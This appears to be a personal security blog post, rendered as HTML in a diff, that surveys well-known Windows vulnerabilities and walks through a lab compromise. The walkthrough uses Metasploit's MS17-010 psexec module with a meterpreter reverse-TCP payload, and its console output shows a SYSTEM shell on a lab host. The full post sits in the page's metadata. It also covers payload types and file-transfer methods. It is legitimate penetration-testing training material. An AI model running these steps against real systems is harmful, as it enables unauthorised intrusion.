@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Prominent Windows Exploit | M1$C0NF1G</title>
+<meta name="keywords" content="windows, exploits">
+<meta name="description" content="Lol">
+<meta name="author" content="Kaal">
+<link rel="canonical" href="//localhost:1313/posts/lol/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.75aa915a206791d9e04e99cb00c5f8a84001e54711f5670597d62ed6acf7c9b2.css" integrity="sha256-daqRWiBnkdngTpnLAMX4qEAB5UcR9WcFl9Yu1qz3ybI=" rel="preload stylesheet" as="style">
+<link rel="icon" href="//localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="//localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="//localhost:1313/posts/lol/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="//localhost:1313/posts/lol/">
+  <meta property="og:site_name" content="M1$C0NF1G">
+  <meta property="og:title" content="Prominent Windows Exploit">
+  <meta property="og:description" content="Lol">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-11-20T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-11-20T00:00:00+00:00">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Exploits">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Prominent Windows Exploit">
+<meta name="twitter:description" content="Lol">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "//localhost:1313/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Prominent Windows Exploit",
+      "item": "//localhost:1313/posts/lol/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Prominent Windows Exploit",
+  "name": "Prominent Windows Exploit",
+  "description": "Lol",
+  "keywords": [
+    "windows", "exploits"
+  ],
+  "articleBody": "Prominent Windows Exploits Vulnerability Description MS08-067 MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability. Eternal Blue MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host. PrintNightmare A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it here. BlueKeep CVE 2019-0708 is a vulnerability in Microsoft’s RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2. Sigred CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain’s DNS server which is commonly the primary Domain Controller. SeriousSam CVE 2021-36934 exploits an issue with the way Windows handles permission on the C:\\Windows\\system32\\config folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can’t be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials. Zerologon CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds. Enumerating Windows \u0026 Fingerprinting Methods OS Detection Scan sudo nmap -O -v ip Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 17:40 EDT Initiating ARP Ping Scan at 17:40 Scanning 192.168.86.39 [1 port] Completed ARP Ping Scan at 17:40, 0.12s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 17:40 Completed Parallel DNS resolution of 1 host. at 17:40, 0.02s elapsed Initiating SYN Stealth Scan at 17:40 Scanning desktop-jba7h4t.lan (192.168.86.39) [1000 ports] Discovered open port 139/tcp on 192.168.86.39 Discovered open port 135/tcp on 192.168.86.39 Discovered open port 443/tcp on 192.168.86.39 Discovered open port 445/tcp on 192.168.86.39 Discovered open port 902/tcp on 192.168.86.39 Discovered open port 912/tcp on 192.168.86.39 Completed SYN Stealth Scan at 17:40, 1.54s elapsed (1000 total ports) Initiating OS detection (try #1) against desktop-jba7h4t.lan (192.168.86.39) Nmap scan report for desktop-jba7h4t.lan (192.168.86.39) Host is up (0.010s latency). Not shown: 994 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 902/tcp open iss-realsecure 912/tcp open apex-mesh MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate) Device type: general purpose Running: Microsoft Windows 10 OS CPE: cpe:/o:microsoft:windows_10 OS details: Microsoft Windows 10 1709 - 1909 Network Distance: 1 hop Banner Grab to Enumerate Ports sudo nmap -v ip --script banner.nse Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-20 18:01 EDT NSE: Loaded 1 scripts for scanning. Discovered open port 135/tcp on 192.168.86.39 Discovered open port 139/tcp on 192.168.86.39 Discovered open port 445/tcp on 192.168.86.39 Discovered open port 443/tcp on 192.168.86.39 Discovered open port 912/tcp on 192.168.86.39 Discovered open port 902/tcp on 192.168.86.39 Completed SYN Stealth Scan at 18:01, 1.46s elapsed (1000 total ports) NSE: Script scanning 192.168.86.39. Initiating NSE at 18:01 Completed NSE at 18:01, 20.11s elapsed Nmap scan report for desktop-jba7h4t.lan (192.168.86.39) Host is up (0.012s latency). Not shown: 994 closed tcp ports (reset) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 902/tcp open iss-realsecure | banner: 220 VMware Authentication Daemon Version 1.10: SSL Required, Se |_rverDaemonProtocol:SOAP, MKSDisplayProtocol:VNC , , NFCSSL supported/t 912/tcp open apex-mesh | banner: 220 VMware Authentication Daemon Version 1.0, ServerDaemonProto |_col:SOAP, MKSDisplayProtocol:VNC , , MAC Address: DC:41:A9:FB:BA:26 (Intel Corporate) Bats, DLLs, \u0026 MSI Files, Oh My! Payload Types to Consider DLLs A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls.\nBatch Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of .bat. We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port.\nVBS VBScript is a lightweight scripting language based on Microsoft’s Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code.\nMSI .MSI files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run msiexec to execute our file, which will provide us with further access, such as an elevated reverse shell.\nPowershell Powershell is both a shell environment and scripting language. It serves as Microsoft’s modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process.\nTools, Tactics, and Procedures for Payload Generation, Transfer, and Execution Payload Generation Resource Description MSFVenom \u0026 Metasploit-Framework Source MSF is an extremely versatile tool for any pentester’s toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife. Payloads All The Things Source Here, you can find many different resources and cheat sheets for payload generation and general methodology. Mythic C2 Framework Source The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation. Nishang Source Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester. Darkarmour Source Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts. Payload Transfer and Execution: Impacket: Impacket is a toolset built in Python that provides us with a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with psexec, smbclient, wmi, Kerberos, and the ability to stand up an SMB server. Payloads All The Things: is a great resource to find quick oneliners to help transfer files across hosts expediently. SMB: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links. Remote execution via MSF: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically. Other Protocols: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use. Example Compromise Walkthrough Enumerate the Host nmap -v -A 10.129.201.97 Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-27 18:13 EDT NSE: Loaded 153 scripts for scanning. NSE: Script Pre-scanning. Discovered open port 135/tcp on 10.129.201.97 Discovered open port 80/tcp on 10.129.201.97 Discovered open port 445/tcp on 10.129.201.97 Discovered open port 139/tcp on 10.129.201.97 Completed Connect Scan at 18:13, 12.76s elapsed (1000 total ports) Completed Service scan at 18:13, 6.62s elapsed (4 services on 1 host) NSE: Script scanning 10.129.201.97. Nmap scan report for 10.129.201.97 Host is up (0.13s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: 10.129.201.97 - / 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h20m00s, deviation: 4h02m30s, median: 0s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: SHELLS-WINBLUE | NetBIOS computer name: SHELLS-WINBLUE\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2021-09-27T15:13:28-07:00 | smb-security-mode: | account_used: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-09-27T22:13:30 |_ start_date: 2021-09-23T15:29:29 Determine an Exploit Path use auxiliary/scanner/smb/smb_ms17_010 show options Module options (auxiliary/scanner/smb/smb_ms17_010): Name Current Setting Required Description ---- --------------- -------- ----------- CHECK_ARCH true no Check for architecture on vulnerable hosts CHECK_DOPU true no Check for DOUBLEPULSAR on vulnerable hosts CHECK_PIPE false no Check for named pipe on vulnerable hosts NAMED_PIPES /usr/share/metasploit-framewor yes List of named pipes to check k/data/wordlists/named_pipes.t xt RHOSTS yes The target host(s), range CIDR identifier, or hosts f ile with syntax 'file:' RPORT 445 yes The SMB service port (TCP) SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as THREADS 1 yes The number of concurrent threads (max one per host) msf6 auxiliary(scanner/smb/smb_ms17_010) \u003e set RHOSTS 10.129.201.97 RHOSTS =\u003e 10.129.201.97 msf6 auxiliary(scanner/smb/smb_ms17_010) \u003e run [+] 10.129.201.97:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2016 Standard 14393 x64 (64-bit) [*] 10.129.201.97:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Choose \u0026 Configure Our Exploit \u0026 Payload search eternal Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average Yes MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption 1 exploit/windows/smb/ms17_010_eternalblue_win8 2017-03-14 average No MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+ 2 exploit/windows/smb/ms17_010_psexec 2017-03-14 normal Yes MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution 3 auxiliary/admin/smb/ms17_010_command 2017-03-14 normal No MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution 4 auxiliary/scanner/smb/smb_ms17_010 normal No MS17-010 SMB RCE Detection 5 exploit/windows/smb/smb_doublepulsar_rce 2017-04-14 great Yes SMB DOUBLEPULSAR Remote Code Execution Configure The Exploit \u0026 Payload use 2 [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp msf6 exploit(windows/smb/ms17_010_psexec) \u003e options Module options (exploit/windows/smb/ms17_010_psexec): Name Current Setting Required Description ---- --------------- -------- ----------- DBGTRACE false yes Show extra debug trace info LEAKATTEMPTS 99 yes How many times to try to leak transaction NAMEDPIPE no A named pipe that can be connected to (leave bl ank for auto) NAMED_PIPES /usr/share/metasploit-frame yes List of named pipes to check work/data/wordlists/named_p ipes.txt RHOSTS yes The target host(s), range CIDR identifier, or h osts file with syntax 'file:' RPORT 445 yes The Target port (TCP) SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing SERVICE_DISPLAY_NAME no The service display name SERVICE_NAME no The service name SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder s hare SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 192.168.86.48 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Validate Our Options msf6 exploit(windows/smb/ms17_010_psexec) \u003e show options Module options (exploit/windows/smb/ms17_010_psexec): Name Current Setting Required Description ---- --------------- -------- ----------- DBGTRACE false yes Show extra debug trace info LEAKATTEMPTS 99 yes How many times to try to leak transaction NAMEDPIPE no A named pipe that can be connected to (leave bl ank for auto) NAMED_PIPES /usr/share/metasploit-frame yes List of named pipes to check work/data/wordlists/named_p ipes.txt RHOSTS 10.129.201.97 yes The target host(s), range CIDR identifier, or h osts file with syntax 'file:' RPORT 445 yes The Target port (TCP) SERVICE_DESCRIPTION no Service description to to be used on target for pretty listing SERVICE_DISPLAY_NAME no The service display name SERVICE_NAME no The service name SHARE ADMIN$ yes The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder s hare SMBDomain . no The Windows domain to use for authentication SMBPass no The password for the specified username SMBUser no The username to authenticate as Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.14.12 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Execute Our Attack msf6 exploit(windows/smb/ms17_010_psexec) \u003e exploit [*] Started reverse TCP handler on 10.10.14.12:4444 [*] 10.129.201.97:445 - Target OS: Windows Server 2016 Standard 14393 [*] 10.129.201.97:445 - Built a write-what-where primitive... [+] 10.129.201.97:445 - Overwrite complete... SYSTEM session obtained! [*] 10.129.201.97:445 - Selecting PowerShell target [*] 10.129.201.97:445 - Executing the payload... [+] 10.129.201.97:445 - Service start timed out, OK if running a command or non-service executable... [*] Sending stage (175174 bytes) to 10.129.201.97 [*] Meterpreter session 1 opened (10.10.14.12:4444 -\u003e 10.129.201.97:50215) at 2021-09-27 18:58:00 -0400 meterpreter \u003e getuid Server username: NT AUTHORITY\\SYSTEM meterpreter \u003e Identify Our Shell meterpreter \u003e shell Process 4844 created. Channel 1 created. Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003e CMD-Prompt and PowerShell for Fun and Profit Use CMD when:\nYou are on an older host that may not include PowerShell. When you only require simple interactions/access to the host. When you plan to use simple batch files, net commands, or MS-DOS native tools. When you believe that execution policies may affect your ability to run scripts or other actions on the host. Use PowerShell when:\nYou are planning to utilize cmdlets or other custom-built scripts. When you wish to interact with .NET objects instead of text output. When being stealthy is of lesser concern. If you are planning to interact with cloud-based services and hosts. If your scripts set and use Aliases. Challenge Gain a shell on the vulnerable target, then submit the contents of the flag.txt file that can be found in C:\\ First scan the target and yep we see 445 is open start msfconsole and use the smb eternal blue scanner ms17_010 Voila!! its vulnerable now use the ms17_010_psexec and grab an interactive shell on the target Voila!! type the flag ",
+  "wordCount" : "2751",
+  "inLanguage": "en",
+  "datePublished": "2025-11-20T00:00:00Z",
+  "dateModified": "2025-11-20T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Kaal"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "//localhost:1313/posts/lol/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "M1$C0NF1G",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "//localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="//localhost:1313/" accesskey="h" title="M1$C0NF1G (Alt + H)">M1$C0NF1G</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="//localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/writeups/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/notes/" title="Notes">
+                    <span>Notes</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/tools/" title="Tools">
+                    <span>Tools</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Prominent Windows Exploit
+    </h1>
+    <div class="post-description">
+      Lol
+    </div>
+    <div class="post-meta"><span title='2025-11-20 00:00:00 +0000 UTC'>November 20, 2025</span>&nbsp;·&nbsp;<span>13 min</span>&nbsp;·&nbsp;<span>Kaal</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#prominent-windows-exploits" aria-label="Prominent Windows Exploits">Prominent Windows Exploits</a><ul>
+                        
+                <li>
+                    <a href="#enumerating-windows--fingerprinting-methods" aria-label="Enumerating Windows &amp; Fingerprinting Methods">Enumerating Windows &amp; Fingerprinting Methods</a><ul>
+                        
+                <li>
+                    <a href="#os-detection-scan" aria-label="OS Detection Scan">OS Detection Scan</a></li>
+                <li>
+                    <a href="#banner-grab-to-enumerate-ports" aria-label="Banner Grab to Enumerate Ports">Banner Grab to Enumerate Ports</a></li></ul>
+                </li></ul>
+                </li>
+                <li>
+                    <a href="#bats-dlls--msi-files-oh-my" aria-label="Bats, DLLs, &amp; MSI Files, Oh My!">Bats, DLLs, &amp; MSI Files, Oh My!</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#payload-types-to-consider" aria-label="Payload Types to Consider">Payload Types to Consider</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#tools-tactics-and-procedures-for-payload-generation-transfer-and-execution" aria-label="Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution">Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#payload-generation" aria-label="Payload Generation">Payload Generation</a></li>
+                <li>
+                    <a href="#payload-transfer-and-execution" aria-label="Payload Transfer and Execution:">Payload Transfer and Execution:</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#example-compromise-walkthrough" aria-label="Example Compromise Walkthrough">Example Compromise Walkthrough</a><ul>
+                        <ul>
+                        
+                <li>
+                    <a href="#enumerate-the-host" aria-label="Enumerate the Host">Enumerate the Host</a></li>
+                <li>
+                    <a href="#determine-an-exploit-path" aria-label="Determine an Exploit Path">Determine an Exploit Path</a></li>
+                <li>
+                    <a href="#choose--configure-our-exploit--payload" aria-label="Choose &amp; Configure Our Exploit &amp; Payload">Choose &amp; Configure Our Exploit &amp; Payload</a></li>
+                <li>
+                    <a href="#configure-the-exploit--payload" aria-label="Configure The Exploit &amp; Payload">Configure The Exploit &amp; Payload</a></li>
+                <li>
+                    <a href="#validate-our-options" aria-label="Validate Our Options">Validate Our Options</a></li>
+                <li>
+                    <a href="#execute-our-attack" aria-label="Execute Our Attack">Execute Our Attack</a></li>
+                <li>
+                    <a href="#identify-our-shell" aria-label="Identify Our Shell">Identify Our Shell</a></li></ul>
+                    </ul>
+                </li>
+                <li>
+                    <a href="#cmd-prompt-and-powershell-for-fun-and-profit" aria-label="CMD-Prompt and PowerShell for Fun and Profit">CMD-Prompt and PowerShell for Fun and Profit</a></li>
+                <li>
+                    <a href="#challenge" aria-label="Challenge">Challenge</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="prominent-windows-exploits">Prominent Windows Exploits<a hidden class="anchor" aria-hidden="true" href="#prominent-windows-exploits">#</a></h2>
+<table>
+  <thead>
+      <tr>
+          <th><strong>Vulnerability</strong></th>
+          <th><strong>Description</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><code>MS08-067</code></td>
+          <td>MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.</td>
+      </tr>
+      <tr>
+          <td><code>Eternal Blue</code></td>
+          <td>MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.</td>
+      </tr>
+      <tr>
+          <td><code>PrintNightmare</code></td>
+          <td>A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it <a href="https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html">here</a>.</td>
+      </tr>
+      <tr>
+          <td><code>BlueKeep</code></td>
+          <td>CVE 2019-0708 is a vulnerability in Microsoft&rsquo;s RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.</td>
+      </tr>
+      <tr>
+          <td><code>Sigred</code></td>
+          <td>CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain&rsquo;s DNS server which is commonly the primary Domain Controller.</td>
+      </tr>
+      <tr>
+          <td><code>SeriousSam</code></td>
+          <td>CVE 2021-36934 exploits an issue with the way Windows handles permission on the <code>C:\Windows\system32\config</code> folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can&rsquo;t be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials.</td>
+      </tr>
+      <tr>
+          <td><code>Zerologon</code></td>
+          <td>CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="enumerating-windows--fingerprinting-methods">Enumerating Windows &amp; Fingerprinting Methods<a hidden class="anchor" aria-hidden="true" href="#enumerating-windows--fingerprinting-methods">#</a></h3>
+<h4 id="os-detection-scan">OS Detection Scan<a hidden class="anchor" aria-hidden="true" href="#os-detection-scan">#</a></h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo nmap -O -v ip
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-09-20 17:40 EDT
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 17:40
+</span></span><span style="display:flex;"><span>Scanning 192.168.86.39 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 17:40, 0.12s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 17:40
+</span></span><span style="display:flex;"><span>Completed Parallel DNS resolution of <span style="color:#ae81ff">1</span> host. at 17:40, 0.02s elapsed
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 17:40
+</span></span><span style="display:flex;"><span>Scanning desktop-jba7h4t.lan <span style="color:#f92672">(</span>192.168.86.39<span style="color:#f92672">)</span> <span style="color:#f92672">[</span><span style="color:#ae81ff">1000</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 192.168.86.39
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 192.168.86.39
+</span></span><span style="display:flex;"><span>Discovered open port 443/tcp on 192.168.86.39
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 192.168.86.39
+</span></span><span style="display:flex;"><span>Discovered open port 902/tcp on 192.168.86.39
+</span></span><span style="display:flex;"><span>Discovered open port 912/tcp on 192.168.86.39
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 17:40, 1.54s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1000</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating OS detection <span style="color:#f92672">(</span>try <span style="color:#75715e">#1) against desktop-jba7h4t.lan (192.168.86.39)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> desktop-jba7h4t.lan <span style="color:#f92672">(</span>192.168.86.39<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.010s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">994</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>135/tcp open  msrpc
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn
+</span></span><span style="display:flex;"><span>443/tcp open  https
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span>902/tcp open  iss-realsecure
+</span></span><span style="display:flex;"><span>912/tcp open  apex-mesh
+</span></span><span style="display:flex;"><span>MAC Address: DC:41:A9:FB:BA:26 <span style="color:#f92672">(</span>Intel Corporate<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Device type: general purpose
+</span></span><span style="display:flex;"><span>Running: Microsoft Windows <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>OS CPE: cpe:/o:microsoft:windows_10
+</span></span><span style="display:flex;"><span>OS details: Microsoft Windows <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">1709</span> - <span style="color:#ae81ff">1909</span>
+</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">1</span> hop
